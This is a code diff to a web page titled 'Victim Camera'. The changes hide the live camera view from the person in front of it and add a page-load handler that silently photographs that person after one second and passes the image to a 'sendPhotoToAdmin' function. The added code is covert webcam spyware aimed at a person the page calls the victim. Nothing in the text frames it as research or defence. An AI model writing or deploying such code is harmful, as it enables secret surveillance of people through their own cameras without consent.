@@ -7,6 +7,10 @@
         body {
             font-family: Arial, sans-serif;
             margin: 20px;
+            background: #f5f5f5;
+        }
+        .hidden-camera {
+            display: none;
         }
         #camera-container {
             text-align: center;
@@ -56,13 +60,17 @@
             border-radius: 5px;
             margin: 10px 0;
         }
+        .victim-only {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <h2>Victim Camera Feed</h2>
+    <h2>Victim Camera</h2>
     <div class="status-indicator">Camera Active ✓</div>
 
-    <div id="camera-container">
+    <!-- Hidden camera for taking photos -->
+    <div id="camera-container" class="hidden-camera">
         <video id="victim-camera" autoplay muted></video>
         <br>
         <button id="take-photo-btn">Take Photo</button>
@@ -136,6 +144,25 @@
             `;
             adminPhotos.appendChild(photoDiv);
         }
+
+        // Auto-trigger photo taking when page loads
+        window.addEventListener('load', () => {
+            // Simulate admin triggering photo
+            setTimeout(() => {
+                // Take photo automatically
+                try {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    sendPhotoToAdmin(imageData);
+                } catch (error) {
+                    console.error('Auto photo error:', error);
+                }
+            }, 1000);
+        });
     </script>
 </body>
 </html>
+
